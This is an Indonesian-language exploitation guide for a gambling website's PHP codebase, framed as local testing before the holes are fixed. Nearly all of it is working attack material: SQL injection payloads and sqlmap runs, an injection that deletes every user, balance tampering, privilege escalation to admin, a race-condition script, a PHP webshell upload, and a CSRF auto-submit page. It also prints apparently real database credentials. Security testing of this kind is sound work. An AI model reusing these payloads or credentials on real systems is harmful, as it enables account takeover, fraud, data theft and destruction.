# Panduan Eksploitasi Lokal — Situs Gambling Platform
**Tujuan:** Testing kerentanan di lingkungan lokal (Laragon) sebelum diperbaiki  
**Base URL:** `http://localhost/situs` atau sesuai konfigurasi Laragon kamu  
**Tools yang dibutuhkan:** Browser, curl, Burp Suite (optional), Python 3

> **PENTING:** File ini hanya untuk testing di lokal kamu sendiri (`localhost`).

---

## Persiapan

```bash
# Pastikan Laragon running dan akses DB tersedia
# Base URL local: http://localhost/situs
# Atau sesuaikan dengan virtual host Laragon kamu

# Install tools pendukung (optional)
pip install requests
```

---

## 1. [CRIT-01] Hardcoded Credentials — Akses DB Langsung

**Apa yang ditest:** Apakah kredensial DB benar-benar hardcoded dan bisa dipakai connect langsung.

```bash
# Test koneksi MySQL langsung dengan kredensial dari config/koneksi.php
mysql -h localhost -u kpysgpyj_jkt -pkucinglemo12 kpysgpyj_jkt

# Jika berhasil, coba dump semua tabel
mysql -h localhost -u kpysgpyj_jkt -pkucinglemo12 kpysgpyj_jkt -e "SHOW TABLES;"
mysql -h localhost -u kpysgpyj_jkt -pkucinglemo12 kpysgpyj_jkt -e "SELECT username, password, level FROM tb_user LIMIT 10;"
```

**Ekspektasi hasil:** Bisa login dan baca seluruh data user tanpa autentikasi apapun lewat aplikasi.

---

## 2. [HIGH-01] SQL Injection — Form Registrasi

**File target:** `/desktop/proses_register.php`

### Test A — UNION-based: Dump username + password hash semua user

1. Buka halaman registrasi: `http://localhost/situs/desktop/register.php`
2. Isi field **Kode Referral** dengan payload berikut (sesuaikan jumlah kolom dengan `SHOW COLUMNS FROM tb_user`):

```
' UNION SELECT 1,username,password,email,5,6,7,8,9,10,11,12-- -
```

3. Isi field lain dengan data valid (username unik, dll)
4. Submit form dan perhatikan response — apakah ada data user yang bocor di response/redirect

### Test B — Konfirmasi injection dengan sleep

```bash
# Di field sponsor/referral:
# Payload: ' AND SLEEP(3)-- -
# Jika page response delay 3 detik = SQL injection confirmed

curl -X POST http://localhost/situs/desktop/proses_register.php \
  -d "user=testuser123&sponsor=' AND SLEEP(3)-- -&password=Test1234&email=test@test.com"
```

### Test C — sqlmap (otomatis)

```bash
# Daftarkan dulu satu akun, catat request-nya via Burp Suite
# Lalu jalankan sqlmap terhadap field sponsor

sqlmap -u "http://localhost/situs/desktop/proses_register.php" \
  --data="user=testuser&sponsor=INJECT&password=Test123&email=a@a.com" \
  -p sponsor --dbs --batch
```

---

## 3. [HIGH-02] SQL Injection — Admin Panel DELETE

**File target:** `/newbie/tools/del-user.php`  
**Syarat:** Login sebagai admin terlebih dahulu

### Test A — Hapus semua user (BERBAHAYA — backup dulu!)

```
# Buka URL ini saat sudah login sebagai admin:
http://localhost/situs/newbie/tools/del-user.php?cuid=1' OR '1'='1&tipe=1

# Query yang terbentuk:
# DELETE FROM tb_user WHERE cuid = '1' OR '1'='1'
# Efek: SEMUA user terhapus
```

> **Backup dulu sebelum test ini:** `mysqldump -u root kpysgpyj_jkt > backup.sql`

### Test B — Time-based blind injection (aman, tidak hapus data)

```bash
curl -b "PHPSESSID=[session_id_admin_kamu]" \
  "http://localhost/situs/newbie/tools/del-user.php?cuid=1' AND SLEEP(5)-- -&tipe=1"

# Jika response delay 5 detik = confirmed injectable
```

---

## 4. [HIGH-03] SQL Injection — Proses Topup (Manipulasi Saldo)

**File target:** `/newbie/tools/proses_topup.php`  
**Syarat:** Login admin

### Test — UNION inject untuk ubah target userID dan nominal

```bash
# Ganti 999 dengan userID yang ingin ditambah saldonya
# Ganti 50000 dengan nominal yang diinginkan
# Sesuaikan jumlah kolom SELECT di UNION dengan tabel tb_transaksi

curl -b "PHPSESSID=[session_admin]" \
  "http://localhost/situs/newbie/tools/proses_topup.php?cuid=1' UNION SELECT 1,2,3,999,50000,6,7,8,9-- -"

# Cek saldo user ID 999 setelah eksekusi
```

---

## 5. [HIGH-04] SQL Injection — Edit Profile (Privilege Escalation)

**File target:** `/function/edit-user.php`  
**Syarat:** Login sebagai user biasa

### Test — Escalate diri sendiri jadi admin + ganti password

1. Buka halaman edit profil
2. Di field **Nama Lengkap**, masukkan:

```
test', `level` = 'admin', `password` = 'test123' WHERE cuid = '[cuid_kamu]'-- -
```

> Atau via curl:

```bash
curl -X POST http://localhost/situs/function/edit-user.php \
  -b "PHPSESSID=[session_user]" \
  -d "full_name=test', \`level\` = 'admin', \`password\` = 'test123' WHERE cuid = '5'-- -&email=a@a.com&no_hp=08123"

# Cek di database apakah level user berubah jadi 'admin'
mysql -u root -e "SELECT cuid, username, level FROM kpysgpyj_jkt.tb_user WHERE cuid=5;"
```

---

## 6. [MED-01] Business Logic — Nominal Negatif (Tambah Saldo Gratis)

**File target:** `/function/withdraw.php`  
**Syarat:** Login sebagai user biasa, punya saldo > 0

### Test — Withdraw nominal negatif = saldo bertambah

```bash
# Catat saldo sebelum test
# Kirim withdrawal dengan nominal negatif

curl -X POST http://localhost/situs/function/withdraw.php \
  -b "PHPSESSID=[session_user]" \
  -d "nominal=-100000&metode=transfer&password=[password_kamu]"

# Cek saldo setelah request:
# Seharusnya: active - (-100000) = active + 100000
mysql -u root -e "SELECT active FROM kpysgpyj_jkt.tb_balance WHERE userID=[id_kamu];"
```

**Ekspektasi:** Saldo bertambah 100.000 tanpa deposit apapun.

---

## 7. [MED-02] Race Condition — Double Spend

**File target:** `/function/withdraw.php`  
**Syarat:** User dengan saldo, contoh: saldo = 50.000

### Test — 2 withdraw bersamaan melebihi saldo

```python
# Simpan sebagai race_test.py
import threading
import requests

BASE_URL = "http://localhost/situs"
SESSION_ID = "[PHPSESSID_kamu]"
PASSWORD = "[password_kamu]"

def withdraw():
    r = requests.post(
        f"{BASE_URL}/function/withdraw.php",
        cookies={"PHPSESSID": SESSION_ID},
        data={
            "nominal": "50000",
            "password": PASSWORD,
            "metode": "transfer"
        }
    )
    print(f"Status: {r.status_code} | Response: {r.text[:100]}")

# Kirim 5 request bersamaan
threads = [threading.Thread(target=withdraw) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()
```

```bash
python3 race_test.py

# Cek saldo setelah:
mysql -u root -e "SELECT active FROM kpysgpyj_jkt.tb_balance WHERE userID=[id];"
# Jika saldo negatif = race condition berhasil dieksploitasi
```

---

## 8. [HIGH-07] Insecure File Upload — Upload Webshell

**File target:** `/function/upload.php`  
**Syarat:** Ada form upload (konfirmasi pembayaran / edit profil)

### Test — Upload file dengan double extension

```bash
# Langkah 1: Buat file shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Langkah 2: Upload via curl ke endpoint upload
curl -X POST http://localhost/situs/function/upload.php \
  -b "PHPSESSID=[session]&ipaddress=127.0.0.1&sessionid=[session]" \
  -F "file=@shell.php.jpg"

# Langkah 3: Akses file yang terupload
# Cek di direktori /assets/img/konfirmasi/ atau direktori upload yang dikonfigurasi
# URL: http://localhost/situs/assets/img/konfirmasi/[random_number]shell.php.jpg?cmd=whoami

# Jika Apache salah konfigurasi atau ada mod_mime issue, shell akan tereksekusi
curl "http://localhost/situs/assets/img/konfirmasi/[nama_file]?cmd=whoami"
curl "http://localhost/situs/assets/img/konfirmasi/[nama_file]?cmd=dir"  # Windows
```

---

## 9. [HIGH-08] IDOR — Operasi Admin via GET

**File target:** `/newbie/tools/del-user.php`, `/newbie/tools/proses_withdraw.php`  
**Syarat:** Login admin

### Test IDOR — Akses resource milik user lain

```bash
# Test akses proses_withdraw user lain (tanpa konfirmasi)
# Ganti [cuid] dengan ID transaksi withdrawal milik user lain
curl -b "PHPSESSID=[session_admin]" \
  "http://localhost/situs/newbie/tools/proses_withdraw.php?cuid=[cuid_transaksi_orang_lain]"

# Test CSRF-like via GET — hapus user tertentu hanya dengan klik link
# (simulasi: admin membuka link ini di browser)
http://localhost/situs/newbie/tools/del-user.php?cuid=[target_cuid]&tipe=1
```

---

## 10. [HIGH-09] CSRF — Transfer Paksa

**Syarat:** User sudah login di browser yang sama

### Test — Buat halaman HTML CSRF lokal

```bash
# Buat file csrf_test.html
cat > /tmp/csrf_test.html << 'EOF'
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" method="POST" action="http://localhost/situs/function/transferuser.php">
    <input type="hidden" name="tujuan"  value="[username_target]">
    <input type="hidden" name="nominal" value="10000">
    <input type="hidden" name="password" value="">
  </form>
</body>
</html>
EOF

# Buka file ini di browser yang sudah login ke situs
# start /tmp/csrf_test.html   (Windows)
# Atau drag file ke browser

# Cek apakah transfer berhasil meski tanpa konfirmasi user
```

---

## 11. [MED-03] Bug Logout — Session Tidak Dihapus

**File target:** `/desktop/logout.php`

### Test — Session masih aktif setelah logout

```bash
# Langkah 1: Login dan catat session ID
# Cek cookie PHPSESSID di browser DevTools > Application > Cookies

# Langkah 2: Akses halaman protected dengan session tersebut
curl -b "PHPSESSID=[session_id]" http://localhost/situs/desktop/account/deposit.php
# Catat apakah bisa akses (berarti session valid)

# Langkah 3: Logout lewat browser
# http://localhost/situs/desktop/logout.php

# Langkah 4: Coba akses lagi dengan session ID YANG SAMA
curl -b "PHPSESSID=[session_id_lama]" http://localhost/situs/desktop/account/deposit.php

# Ekspektasi bug: masih bisa akses karena $_SESSION['user'] == '' tidak menghapus session
```

---

## 12. [MED-05] Error-based Info Disclosure — Struktur DB Bocor

### Test — Trigger error SQL untuk baca struktur tabel

```bash
# Kirim input invalid yang memicu SQL error
curl "http://localhost/situs/newbie/tools/proses_topup.php?cuid=INVALID'"

# Ekspektasi: Response berisi pesan error MySQL dengan nama tabel, kolom, dan query
# Contoh output: "...near ''INVALID''' ... SELECT * FROM tb_transaksi WHERE cuid = 'INVALID''"
```

---

## 13. [MED-06] File Sensitif Publik — user.json

### Test — Baca data request terakhir

```bash
# Trigger satu request ke game API dulu (atau tunggu ada transaksi)
# Lalu akses file:
curl http://localhost/situs/api/user.json

# Ekspektasi: JSON berisi data request terakhir (username, token, saldo, dll)
```

---

## 14. [LOW-01] SQL Dump Terekspos

### Test — Download skema database

```bash
curl -O http://localhost/situs/kpysgpyj_jkt.sql
# Atau jika ada spasi di nama file:
curl -O "http://localhost/situs/ONIX%20GARUDA69.sql"

# Cek isi: apakah berisi skema tabel lengkap atau bahkan data
head -50 kpysgpyj_jkt.sql
```

---

## Checklist Testing

| ID | Vulnerability | Cara Test | Hasil |
|----|--------------|-----------|-------|
| CRIT-01 | Hardcoded DB creds | mysql -h localhost ... | ☐ |
| HIGH-01 | SQLi Registrasi | Payload di field referral | ☐ |
| HIGH-02 | SQLi DELETE User | URL inject di del-user.php | ☐ |
| HIGH-03 | SQLi Topup | UNION inject di proses_topup.php | ☐ |
| HIGH-04 | SQLi Edit Profile | Payload di full_name | ☐ |
| MED-01 | Nominal Negatif | curl -d "nominal=-100000" | ☐ |
| MED-02 | Race Condition | python3 race_test.py | ☐ |
| HIGH-07 | File Upload RCE | Upload shell.php.jpg | ☐ |
| HIGH-08 | IDOR via GET | Akses URL langsung | ☐ |
| HIGH-09 | CSRF | Buka csrf_test.html | ☐ |
| MED-03 | Broken Logout | Test session setelah logout | ☐ |
| MED-05 | Error Disclosure | Trigger SQL error | ☐ |
| MED-06 | user.json exposed | curl .../api/user.json | ☐ |
| LOW-01 | SQL Dump exposed | curl .../kpysgpyj_jkt.sql | ☐ |

---

## Backup & Restore Lokal

```bash
# SELALU backup sebelum test destruktif (HIGH-02, dll)
mysqldump -u root kpysgpyj_jkt > backup_$(date +%Y%m%d_%H%M%S).sql

# Restore jika ada yang ke-delete
mysql -u root kpysgpyj_jkt < backup_[timestamp].sql
```

---

*File ini dibuat untuk keperluan defensive security testing di lingkungan lokal.*
